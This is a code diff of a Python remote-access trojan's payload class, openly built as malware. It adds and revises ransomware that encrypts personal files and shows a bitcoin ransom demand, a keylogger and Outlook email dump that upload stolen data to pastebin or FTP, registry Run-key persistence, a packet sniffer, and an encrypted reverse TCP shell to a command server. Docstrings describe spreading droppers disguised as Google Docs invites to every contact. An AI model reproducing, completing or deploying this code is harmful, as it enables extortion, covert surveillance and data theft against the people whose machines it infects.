@@ -28,7 +28,6 @@ for pkg in ['os', 'sys', 'mss', 'cv2', 'wmi', 'time', 'json', 'zlib', 'uuid', 'n
     try:
         exec 'import {}'.format(pkg) in globals()
     except: pass
-        
 
 def config(*arg, **options):
     def _config(function):
@@ -193,9 +192,9 @@ class Payload():
             return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(x)-1))
         except Exception as e:
             Payload.debug("{} error: {}".format(Payload._get_random_var.func_name, str(e)))
-            
 
-    @staticmethod            
+
+    @staticmethod
     def _get_job_status(c):
         try:
             c = int(str(c).partition('.')[0])
@@ -209,7 +208,7 @@ class Payload():
         except Exception as e:
             Payload.debug("{} error: {}".format(Payload._get_job_status.func_name, str(e)))
 
-            
+
     @staticmethod
     def _get_post_request(url, headers={}, data={}):
         try:
@@ -251,18 +250,11 @@ class Payload():
 
 
     @staticmethod
-    def _get_registry_key(key_name, key_value, system=False):
+    def _get_new_registry_key(registry_key, key, value):
         try:
-            key_name, key_value = [str(key_name), str(key_value)]
-            run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_WRITE)
-            _winreg.SetValueEx(reg_key, key_name, 0, _winreg.REG_SZ, key_value)
+            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, registry_key, 0, _winreg.KEY_WRITE)
+            _winreg.SetValueEx(reg_key, key, 0, _winreg.REG_SZ, value)
             _winreg.CloseKey(reg_key)
-            if system:
-                run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
-                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_WRITE)
-                _winreg.SetValueEx(reg_key, '*' + key_name, 0, _winreg.REG_SZ, key_value)
-                _winreg.CloseKey(reg_key)
             return True
         except Exception as e:
             Payload.debug("{} error: {}".format(str(e)))
@@ -322,7 +314,7 @@ class Payload():
             return output
         except Exception as e:
             Payload.debug("{} error: {}".format(Payload._get_emails_as_json.func_name, str(e)))
-            
+
 
     @staticmethod
     def _get_delete(target):
@@ -368,7 +360,7 @@ class Payload():
             return {i.partition('=')[0]: i.partition('=')[2] for i in str(inputstring).split() if '=' in i}
         except Exception as e:
             Payload.debug("{} error: {}".format(Payload._get_kwargs_from_string.func_name, str(e)))
-        
+
 
     def _get_system(self):
         info = {}
@@ -381,7 +373,7 @@ class Payload():
                     self.debug("{} error: {}".format(self._get_system.func_name, str(e)))
         return info
 
-    
+
     def _get_commands(self):
         commands = {}
         for cmd in vars(Payload):
@@ -402,33 +394,10 @@ class Payload():
             time.sleep(5)
             os.execl(sys.executable, 'python', sys.argv[0], *sys.argv[1:])
         except Exception as e:
-            self.debug("{} error: {}".format(self._get_restart.func_name, str(e)))    
+            self.debug("{} error: {}".format(self._get_restart.func_name, str(e)))
 
 
-    def _get_public_key(self, *args, **kwargs):
-        raw_buffer  = ""
-        try:
-            attempt = 1
-            self._session['socket'].sendall(self._aes_encrypt(json.dumps({"request":"public_key"}), self._session['key']) + '\n')
-            while "\n" not in raw_buffer:
-                try:
-                    raw_buffer += self._session['socket'].recv(1024)
-                except socket.timeout:
-                    attempt += 1
-                    if attempt <= 3:
-                        self.debug("Timed out waiting for Crypto.PublicKey.RSA Public Key - retrying...\nAttempt: %d" % attempt)
-                        continue
-                    else:
-                        break
-            if raw_buffer:
-                key = self._aes_decrypt(raw_buffer, self._session['key'])
-                rsa = Crypto.PublicKey.RSA.importKey(key)
-                return rsa
-        except Exception as e:
-            self.debug("{} error: {}".format(self._get_public_key.func_name, str(e)))
-        return self._get_restart(self._get_public_key.func_name)
-
-
+    @threaded
     def _get_packets(self, **kwargs):
         seconds = kwargs.get('seconds') if kwargs.get('seconds') else 30
         mode    = kwargs.get('mode') if kwargs.get('mode') else 'pastebin'
@@ -520,66 +489,12 @@ class Payload():
                 return "File '{}' not found".format(filepath)
         except Exception as e:
             return "{} error: {}".format(self._aes_decrypt_file.func_name, str(e))
-        
 
-    def _mode(self, mode):
-        try:
-            if 'passive' in mode:
-                self._flags['mode'].clear()
-                self._workers[self._mode_passive.func_name] = threading.Thread(target=self._mode_passive, name=time.time())
-                self._workers[self._mode_passive.func_name].daemon = True
-                self._workers[self._mode_passive.func_name].start()
-            elif 'shell' in mode:
-                self._flags['mode'].set()
-                self._workers[self._server_prompt.func_name] = threading.Thread(target=self._server_prompt, name=time.time())
-                self._workers[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-                self._workers[self._server_prompt.func_name].daemon = True
-                self._workers[self.reverse_tcp_shell.func_name].daemon = True
-                self._workers[self._server_prompt.func_name].start()
-                self._workers[self.reverse_tcp_shell.func_name].start()
-            else:
-                self.debug("{} error: {}".format(self._mode.func_name, "invalid mode: %s" % str(mode)))
-        except Exception as e:
-            self.debug("{} error: {}".format(self._mode.func_name, str(e)))
-        
-
-
-    def _mode_passive(self, minutes=60, interval=5, run_once=['keylogger auto', 'ps monitor start'], run_interval=['webcam image ftp','screenshot ftp']):
-        try:
-            limit = time.time() + float(minutes * 60)
-            addr = None
-            try:
-                addr = self._session['socket'].getpeername()
-                self.kill()
-            except:
-                pass
-            for job in self._mode_passive.run_once:
-                cmd, _, action = job.partition(' ')
-                _ = getattr(self, cmd)(action)
-            while True:
-                time.sleep(self._mode_passive.interval * 60)
-                if time.time() < limit:
-                    results = {}
-                    for task in self._mode_passive.run_interval:
-                        cmd, _, action = task.partition(' ')
-                        task_id = self._task_id(cmd)
-                        try:
-                            output = getattr(self, cmd)(action)
-                        except Exception as e:
-                            output = "{} error: {}".format(str(e))
-                        results[task_id] = output
-                    self._task_submit(**results)
-                else:
-                    break
-        except Exception as e:
-            self.debug('{} error: {}'.format(self._mode_passive.func_name, str(e)))
-        return self._get_restart(self._mode_passive.func_name)
-    
 
     def _upload_imgur(self, source):
         try:
             api_key  = self._server_resource('api imgur api_key')
-            if api_key: 
+            if api_key:
                 data = self._get_normalized_data(source)
                 post = self._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})
                 return str(json.loads(post)['data']['link'])
@@ -641,27 +556,30 @@ class Payload():
             return "{} error: {}".format(self._upload_ftp.func_name, str(e2))
 
 
-    def _ransom_payment(self, session_id=None):
+    def _ransom_payment(self, bitcoin_wallet=None, payment_url=None):
         try:
             if os.name is 'nt':
-                alert = self._get_windows_alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session_id, self._server_resource('api ransom payment')), "Windows Alert")
+                if bitcoin_wallet:
+                    alert = self._get_windows_alert(text = "Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). Below is the temporary bitcoin wallet address created for the transfer. It expires in 12 hours from now at %s, at which point the encryption key will be deleted unless you have paid." %  time.localtime(time.time() + 60 * 60 * 12))
+                elif payment_url:
+                    alert = self._get_windows_alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(self._session['id'], payment_url), "Windows Alert")
                 return "Launched a Windows Message Box with ransom payment information"
             else:
                 return "{} does not yet support {} platform".format(self._ransom_payment.func_name, sys.platform)
         except Exception as e:
             return "{} error: {}".format(self._ransom_payment.func_name, str(e))
 
-                
-    def _ransom_encrypt(self, path):
+
+    def _ransom_encrypt(self, args):
         try:
             if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
-                aes_key = os.urandom(16).encode('hex')
+                aes_key = Crypto.Hash.MD5.new(Crypto.Ransom.get_random_bytes(16)).hexdigest()
                 ransom  = self._aes_encrypt_file(path, key=aes_key)
-                cipher  = Crypto.Cipher.PKCS1_OAEP.new(self._session['public_key'])
+                cipher  = Crypto.Cipher.PKCS1_OAEP.new(self.ransom.pubkey)
                 key     = base64.b64encode(cipher.encrypt(aes_key))
-                task_id = self._task_id(self.ransom.func_name)
-                task    = {'id': task_id, 'Payload': self._sysinfo['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
-                self._results[task_id] = task
+                self._get_new_registry_key(self.ransomregistry_key, path, key)
+                task    = 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?')
+                self._task_save(task, key)
                 self.debug('{} encrypted'.format(path))
                 if 'ransom' not in self._workers or not len([k for k in self._workers if 'ransom' in k if self._workers[k].is_alive()]):
                     rnd = random.randint(11,99)
@@ -688,12 +606,12 @@ class Payload():
             self.debug("{} error: {}".format(self._ransom_decrypt.func_name, str(e)))
 
 
-    def _ransom_encrypt_threader(self, arg):
+    def _ransom_encrypt_threader(self, target):
         try:
-            if os.path.isfile(arg):
-                return self._ransom_encrypt(arg)
-            elif os.path.isdir(arg):
-                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(arg, lambda _, d, f: [self._queue.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
+            if os.path.isfile(target):
+                return self._ransom_encrypt(target)
+            elif os.path.isdir(target):
+                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(target, lambda _, d, f: [self._queue.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
                 self._workers["ransom-tree-walk"].daemon = True
                 self._workers["ransom-tree-walk"].start()
                 for i in range(1,10):
@@ -716,7 +634,7 @@ class Payload():
                             break
                 return json.dumps(result)
             else:
-                return "error: {} not found".format(arg)
+                return "error: {} not found".format(target)
         except Exception as e:
             self.debug("{} error: {}".format(self._ransom_encrypt_threader.func_name, str(e)))
 
@@ -749,6 +667,7 @@ class Payload():
             return "{} error: {}".format(self._sms_send.func_name, str(e))
 
 
+    @threaded
     def _email_dump(self, *args, **kwargs):
         try:
             pythoncom.CoInitialize()
@@ -756,9 +675,9 @@ class Payload():
             outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
-            return self._upload_ftp(json.dumps(emails), filetype='.txt') if 'ftp' in mode else self._upload_pastebin(json.dumps(emails))
+            result  = self._upload_ftp(json.dumps(emails), filetype='.txt') if 'ftp' in mode else self._upload_pastebin(json.dumps(emails))
         except Exception as e2:
-            self.debug("{} error: {}".format(self._email_dump.func_name, str(e2)))
+            result  = "{} error: {}".format(self._email_dump.func_name, str(e2))
 
 
     def _email_search(self, string):
@@ -786,6 +705,7 @@ class Payload():
             return "{} error: {}".format(self._email_search.func_name, str(e))
 
 
+    @threaded
     def _keylogger(self, *args, **kwargs):
         while True:
             try:
@@ -798,24 +718,13 @@ class Payload():
                 break
 
 
-    def _keylogger_status(self,  *args, **kwargs):
-        try:
-            mode    = 'running' if 'keylogger' in self._workers else 'stopped'
-            status  = self._get_job_status(float(m._workers['keylogger'].name))
-            length  = self.keylogger.buffer.tell()
-            return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(self.keylogger.func_name, mode, status, length)
-        except Exception as e:
-            return '{} error: {}'.format(self._keylogger_status.func_name, str(e))
-    
-
+    @threaded
     def _keylogger_auto(self, *args, **kwargs):
         while True:
             try:
                 if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                     result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
-                    task_id = self._task_id(self.keylogger.func_name)
-                    task    = {'id': task_id, 'session': self._session['id'], 'Payload': self._sysinfo['id'], 'command': self.keylogger.func_name, 'result': result}
-                    self._results[task_id] = task
+                    self._task_save(self.keylogger.func_name, result)
                     self.keylogger.buffer.reset()
                 elif self._abort:
                     break
@@ -824,6 +733,16 @@ class Payload():
             except Exception as e:
                 self.debug("{} error: {}".format(self._keylogger_auto.func_name, str(e)))
                 break
+                                                    
+
+    def _keylogger_status(self,  *args, **kwargs):
+        try:
+            mode    = 'running' if 'keylogger' in self._workers else 'stopped'
+            status  = self._get_job_status(float(m._workers['keylogger'].name))
+            length  = self.keylogger.buffer.tell()
+            return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(self.keylogger.func_name, mode, status, length)
+        except Exception as e:
+            return '{} error: {}'.format(self._keylogger_status.func_name, str(e))
 
 
     def _keylogger_event(self, event):
@@ -1298,7 +1217,7 @@ class Payload():
             value = random.choice(self._payload)
             if value and os.path.isfile(value):
                 try:
-                    self._get_registry_key(name, value)
+                    self._get_new_registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                     return (True, name)
                 except Exception as e:
                     self.debug('{} error: {}'.format(self._persistence_add_registry_key.func_name, str(e)))
@@ -1313,7 +1232,7 @@ class Payload():
         if self.persistence.methods['registry_key'].get('established'):
             value = self.persistence.methods['registry_key'].get('result')
             try:
-                key = OpenKey(_winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, _winreg.KEY_ALL_ACCESS)
+                key = OpenKey(_winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_ALL_ACCESS)
                 _winreg.DeleteValue(key, name)
                 _winreg.CloseKey(key)
                 return (False, None)
@@ -1570,9 +1489,8 @@ class Payload():
             while True:
                 if self.ps.buffer.tell() > self.ps.max_bytes:
                     try:
-                        task_id = self._task_id(self._ps_monitor.func_name)
                         result  = self._upload_pastebin(self.ps.buffer) if 'ftp' not in args else self._Upload_ftp(self.ps.buffer)
-                        self._results[task_id] = {'Payload': self._sysinfo['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
+                        self._task_save('process monitor', result)
                         self.ps.buffer.reset()
                     except Exception as e:
                         self.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))
@@ -1601,33 +1519,36 @@ class Payload():
 
     def _server_send(self, **kwargs):    
         try:
-            if self._flags['connection'].wait(timeout=3.0):
-                buff = kwargs.get('result')
-                kwargs.update({'result': buff[:48000]})
+            if self._flags['connection'].wait(timeout=1.0):
+                if kwargs.get('result'):
+                    buff = kwargs.get('result')
+                    kwargs.update({'result': buff[:48000]})
                 data = self._aes_encrypt(json.dumps(kwargs), self._session['key'])
-                self._session['socket'].send(data + '\n')
-                if not len(buff[48000:]):
-                    return
-                else:
+                self._session['socket'].send(struct.pack('L', len(data)) + data)
+                if len(buff[48000:]):
                     kwargs.update({'result': buff[48000:]})
                     return self._server_send(**kwargs)
             else:
                 self.debug("connection timed out")
         except Exception as e:
             self.debug('{} error: {}'.format(self._server_send.func_name, str(e)))
-        return self._get_restart(self._server_send.func_name)
 
 
-    def _server_recv(self):
+    def _server_recv(self, sock=None):
+        if not sock:
+            sock = self._session['socket']
+        header_size = struct.calcsize('L')
+        header = sock.recv(header_size)
+        msg_len = struct.unpack('L', header)[0]
         data = ''
-        while '\n' not in data:
+        while len(data) < msg_len:
             try:
-                data += self._session['socket'].recv(65536)
+                data += sock.recv(1)
             except (socket.timeout, socket.error):
                 break
-        if data and len(bytes(data)):
+        if data and bytes(data):
             try:
-                text = self._aes_decrypt(data.rstrip(), self._session['key'])
+                text = self._aes_decrypt(data, self._session['key'])
                 task = json.loads(text)
                 return task
             except Exception as e2:
@@ -1638,7 +1559,7 @@ class Payload():
         ip   = socket.gethostbyname(socket.gethostname())
         port = kwargs.get('port') if ('port' in kwargs and str(kwargs.get('port')).isdigit()) else 1337
         try:
-            if not self._debug:
+            if not kwargs.get('debug'):
                 if 'config' in kwargs:
                     url, api = urllib.urlopen(kwargs.get('config')).read().splitlines()
                     req = urllib2.Request(url)
@@ -1654,29 +1575,29 @@ class Payload():
                     self.debug("{} error: missing API resources for finding active server".format(self._server_addr.func_name))
         except Exception as e2:
             self.debug("{} error: {}".format(self._server_addr.func_name, str(e2)))
+            return self._get_restart(self._server_addr.func_name)
+        self.debug("Connecting to {}:{}...".format(ip, port))
         return ip, port
     
 
     def _server_connect(self, **kwargs):
         try:
             host, port = self._server_addr(**kwargs)
-            self._flags['connection'].clear()
-            self._flags['mode'].clear() if kwargs.get('mode') == 'passive' else self._flags['mode'].set()
-            self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self._session['socket'].connect((host, port))
-            self._session['socket'].setblocking(True)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((host, port))
+            sock.setblocking(True)
             self._flags['connection'].set() 
-            return self._session['socket']
+            return sock
         except Exception as e:
             self.debug("{} error: {}".format(self._server_connect.func_name, str(e)))
-        return self._get_restart(self._server_connect.func_name)
+            return self._get_restart(self._server_connect.func_name)
 
 
+    @threaded
     def _server_prompt(self, *args, **kwargs):
         self._flags['prompt'].set()
         while True:
             try:
-                self._flags['mode'].wait()
                 self._flags['prompt'].wait()
                 self._server_send(**{'id': '0'*64, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                 self._flags['prompt'].clear()
@@ -1686,39 +1607,31 @@ class Payload():
 
 
     def _server_resource(self, resource):
-        self.debug('Requesting resource: %s' % resource)
-        host, port = self._session['socket'].getpeername() 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((host, port + 1))
-        task = {'client': self._sysinfo.get('id'), 'request':  resource, 'result': ''}
-        sock.sendall(self._aes_encrypt(json.dumps(task), self._session.get('key')) + '\n')
-        data =  ""
-        while '\n' not in buf:
-            try:
-                buf += sock.recv(4096)
-            except (socket.error, socket.timeout):
-                break
-        if buf:
-            data = self._aes_decrypt(data.rstrip(), self._session.get('key')).strip().rstrip()
-            task = json.loads(data)
-        try:
-            sock.shutdown(socket.SHUT_RDWR)
-            sock.close()
-        except: pass
-        return task.get('result')
+        if self._flags['connection'].wait(timeout=3.0):
+            self.debug('Requesting resource: %s' % resource)
+            self._server_send(**{"request": resource, "client": self._sysinfo["id"], "session": self._session["id"], "result": ""})
+            response = self._server_recv()
+            if isinstance(response, dict) and response.get("result"):
+                return response.get('result')
+            else:
+                self.debug("Failed to retreive requested resource '%s'" % resource)
+        else:
+            return self._get_restart(self._session_task.func_name)
+
 
     def _server_task(self, **kwargs):
-        try:
-            if self._flags['connection'].wait(timeout=3.0):
-                addr = self._session['socket'].getpeername()
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1.0)
-                sock.connect((str(addr[0]), int(addr[1]) + 2))
-                sock.sendall(self._aes_encrypt(json.dumps(kwargs), self._session['key']) + '\n')
+        if self._flags['connection'].wait(timeout=3.0):
+            self.debug('Submitting results for task ID: %s' % task['id'])
+            self._server_send(**{"request": resource, "client": self._sysinfo["id"], "session": self._session["id"], "result": ""})
+            response = self._server_recv()
+            if isinstance(response, dict) and response.get("result"):
+                return response.get('result')
             else:
-                self.debug("{} timed out".format(self._server_task.func_name))
-        except Exception as e:
-            self.debug("{} error: {}".format(self._server_task.func_name, str(e)))
+                self.debug("Failed to submit task ID: %s" % task['id'])
+        else:
+            self.debug("Connection timed out...")
+            return self._get_restart(self._session_task.func_name)
+
 
     def _session_id(self):
         try:
@@ -1765,12 +1678,12 @@ class Payload():
         return self._get_restart(self._session_key.func_name)
 
 
-    def _task_id(self, task):
+    def _task_save(self, task, result):
         try:
-            return Crypto.Hash.MD5.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
+            task_id = Crypto.Hash.MD5.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
+            self._results[time.ctime()] = {"id": task_id, "client": self._sysinfo["id"], "session": self._session["id"], "result": result}
         except Exception as e:
-            self.debug("{} error: {}".format(self._task_id.func_name, str(e)))
-
+            result  = "{} error: {}".format(self._task_save.func_name, str(e))
 
     def _task_threader(self):
         try:
@@ -1799,13 +1712,10 @@ class Payload():
                         if not worker.is_alive():
                             dead = self._workers.pop(task, None)
                             del dead
-                            if 'keylogger_manager' in task:
-                                self._workers['keylogger_manager'] = threading.Thread(target=self._keylogger_auto, name=time.time())
-                                self._workers['keylogger_manager'].daemon = True
-                                self._workers['keylogger_manager'].start()
+                            if self._keylogger_auto in task:
+                                self._workers[self._keylogger_auto.func_name] = self._keylogger_auto()
                             elif self.reverse_tcp_shell.func_name in task:
-                                self._workers[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-                                self._workers[self.reverse_tcp_shell.func_name].start()    
+                                self._workers[self.reverse_tcp_shell.func_name] = self._reverse_tcp_shell()
                     time.sleep(1)
         except Exception as e:
             self.debug('{} error: {}'.format('TaskManager', str(e)))
@@ -1822,7 +1732,7 @@ class Payload():
             else:
                 return os.chdir('.')
         except Exception as e:
-            self.debug("{} error: {}".format(self.cd.func_name, str(e)))           
+            self.debug("{} error: {}".format(self.cd.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
@@ -1899,7 +1809,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
     def set(self, arg):
         """
-        set Payload options
+        set client options
         """
         try:
             target, _, opt = arg.partition(' ')
@@ -1930,11 +1840,11 @@ class Payload():
         except Exception as e:
             self.debug("{} error: {}".format(self.set.func_name, str(e)))
 
-    
+
     @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
     def sms(self, args):
         """
-        send/view SMS text message
+        text all host contacts with links to a dropper disguised as Google Docs invite
         """
         mode, _, args = str(args).partition(' ')
         if 'send' in mode:
@@ -1942,7 +1852,7 @@ class Payload():
             return self._sms_send(phone_number, message)
         else:
             return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'
-    
+
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
     def eval(self, code):
@@ -1978,11 +1888,9 @@ class Payload():
         try:
             self._flags['connection'].clear()
             self._flags['prompt'].clear()
-            self._flags['mode'].clear()
             self._session['socket'].shutdown(socket.SHUT_RDWR)
             self._session['socket'].close()
             self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self._session['socket'].shutdown(socket.SHUT_RDWR)
             self._session['id'] = str()
             self._session['key'] = str()
             self._session['public_key'] = str()
@@ -1994,7 +1902,6 @@ class Payload():
                     self.debug("{} error: {}".format(self.kill.func_name, str(e2)))
         except Exception as e:
             self.debug("{} error: {}".format(self.kill.func_name, str(e)))
-            
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
@@ -2019,7 +1926,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
         """
-        show value of a Payload attribute
+        show value of an attribute
         """
         try:
             attribute = str(attribute)
@@ -2096,8 +2003,8 @@ class Payload():
     @config(platforms=['win32','darwin'], inbox=collections.OrderedDict(), command=True, usage='email <option> [mode]')
     def email(self, args=None):
         """
-        access Outlook email without opening application
-        """       
+        use Outlook to email all host contacts with dropper links disguised as Google Docs
+        """
         if not args:
             try:
                 pythoncom.CoInitialize()
@@ -2122,7 +2029,7 @@ class Payload():
                 self.debug("{} error: {}".format(self.email.func_name, str(e)))
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='ransom <mode> [path]')
+    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\AngryEggplant", command=True, usage='ransom <mode> [path]')
     def ransom(self, args):
         """
         encrypt personal files and ransom them
@@ -2130,15 +2037,16 @@ class Payload():
         if not args:
             return "\tusage: ransom <encrypt/decrypt> [path]"
         cmd, _, action = str(args).partition(' ')
-        if not self._session['id']:
-            return "{} error: {}".format(Payload._ransom_payment.func_name, "no session ID")
-        if not self._server_resource('api ransom payment'):
-            return "{} error: {}".format(Payload._ransom_payment.func_name, "no target URL")
         if 'payment' in cmd:
-            return self._ransom_payment(self._session['id'])
+            try:
+                payment = self._server_resource('api bitcoin ransom_payment')
+                return self._ransom_payment(payment)
+            except:
+                return "{} error: {}".format(Payload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
         elif 'decrypt' in cmd:
             return self._ransom_decrypt_threader(action)
         elif 'encrypt' in cmd:
+            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
             return self._ransom_encrypt_threader(action)
         else:
             return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
@@ -2181,24 +2089,6 @@ class Payload():
         except Exception as e:
             result = "{} error: {}".format(self.webcam.func_name, str(e))
         return result
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='mode [option]')
-    def mode(self, mode=None):
-        """
-        display/change run mode (use 'mode help' for list of modes)
-        """
-        try:
-            if not mode:
-                return json.dumps({"mode": "active" if self._flags['mode'].is_set() else "passive"})
-            else:
-                if 'help' in mode:
-                    return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("active"): "interactive reverse TCP shell", "{:>12}".format("passive"): "auto-run tasks and save results"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
-                elif mode in ('active','passive'):
-                    return self._mode(mode)
-        except Exception as e:
-            self.debug("{} error: {}".format(self.passive.func_name, str(e)))
-            return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("active"): "interactive reverse TCP shell", "{:>12}".format("passive"): "auto-run tasks and save results"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
 
 
     @config(platforms=['win32'], command=True, usage='escalate')
@@ -2272,7 +2162,7 @@ class Payload():
                 return json.dumps(self._payload)
         except Exception as e:
             return "{} error: {}".format(self.payload.func_name, str(e))
-            
+
 
     @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
     def keylogger(self, *args, **kwargs):
@@ -2280,7 +2170,7 @@ class Payload():
         start/stop/dump the keylogger
         """
         mode = args[0] if args else None
-        if not mode:                                                                                                                                                                                                                                                                                             
+        if not mode:
             if self.keylogger.func_name not in self._workers:
                 return self.keylogger.usage
             else:
@@ -2288,9 +2178,7 @@ class Payload():
         else:
             if 'start' in mode:
                 if self.keylogger.func_name not in self._workers:
-                    self._workers[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
-                    self._workers[self.keylogger.func_name].setDaemon(True)
-                    self._workers[self.keylogger.func_name].start()
+                    self._workers[self.keylogger.func_name] = self._keylogger()
                     return self._keylogger_status()
                 else:
                     return self._keylogger_status()
@@ -2303,9 +2191,7 @@ class Payload():
                 except: pass
                 return self._keylogger_status()
             elif 'auto' in mode:
-                self._workers[self._keylogger_auto.func_name] = threading.Thread(target=self._keylogger_auto, name=time.time())
-                self._workers[self._keylogger_auto.func_name].setDaemon(True)
-                self._workers[self._keylogger_auto.func_name].start()
+                self._workers[self._keylogger_auto.func_name] = self._keylogger_auto()
                 return self._keylogger_status()
             elif 'dump' in mode:
                 result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in mode else self._upload_ftp(self.keylogger.buffer)
@@ -2372,7 +2258,7 @@ class Payload():
                         length = int(arg)
                     elif arg in ('ftp','pastebin'):
                         mode   = arg
-                self._workers[self.packetsniffer.func_name] = threading.Thread(target=self._get_packets, kwargs={'seconds': length, 'mode': mode}, name=time.time())
+                self._workers[self.packetsniffer.func_name] = self._get_packets(seconds=length, mode=mode)
                 self._workers[self.packetsniffer.func_name].start()
                 return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
@@ -2415,7 +2301,7 @@ class Payload():
             for stager in self._payload:
                 self._get_delete(stager)
             if not self._debug:
-                self._get_delete(sys.argv[0])               
+                self._get_delete(sys.argv[0])
         finally:
             shutdown = threading.Thread(target=self._get_shutdown)
             taskkill = threading.Thread(target=self.ps, args=('kill python',))
@@ -2430,22 +2316,22 @@ class Payload():
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
+            self._workers[self._server_prompt.func_name] = self._server_prompt()
             while True:
                 if self._flags['connection'].wait(timeout=1.0):
-                    if self._flags['mode'].wait():
-                        if not self._flags['prompt'].is_set():
-                            task = self._server_recv()
-                            if isinstance(task, dict):
